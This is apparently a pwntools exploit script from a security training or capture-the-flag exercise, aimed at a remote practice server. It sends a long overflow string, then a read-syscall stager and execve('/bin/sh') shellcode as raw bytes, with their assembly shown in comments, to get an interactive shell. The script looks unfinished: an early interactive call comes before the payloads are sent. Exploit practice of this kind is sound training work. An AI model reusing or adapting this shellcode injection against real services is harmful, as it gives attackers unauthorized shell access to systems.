from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
# Connect to remote machine
#r = remote("training.jinblack.it", 2003)
r = remote("training.jinblack.it", 2005)
#r = process("./server") 

''' not attaching to remote
b * 0x4011d4  b * 0x401251	

gdb.attach(r, """
	
	c        
""")
''' 

input("wait")

r.interactive()

# receive intro
print(r.clean())

r.send("A" * 5000)

'''
jmp endshellcode
shellcode:
pop rdi
mov rsi, rdi
add rsi, 8
mov rdx, rsi
mov rax, 0x3b
syscall

endshellcode:
call shellcode
nop #replace with "/bin/sh"
'''
shellcode = "\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00"

'''
xor rax, rax 		# read call is rax = 0
xor rdi, rdi 		# rdi = 0 is std input
mov rsi, 0x404082 	# write just after this shellcode ends
mov rdx, r11  		# r11 has 256, so we use that as the number of bytes to read
syscall
'''
readcall = b"\x48\x31\xC0\x48\x31\xFF\x48\xC7\xC6\x82\x40\x40\x00\x4C\x89\xDA\x0F\x05"

input("wait")

r.send(readcall)

input("Buffer written with read call, proceed to send shellcode\n")

r.send(shellcode)

# Spawn a shell that allows us to interact with the remote program
r.interactive()

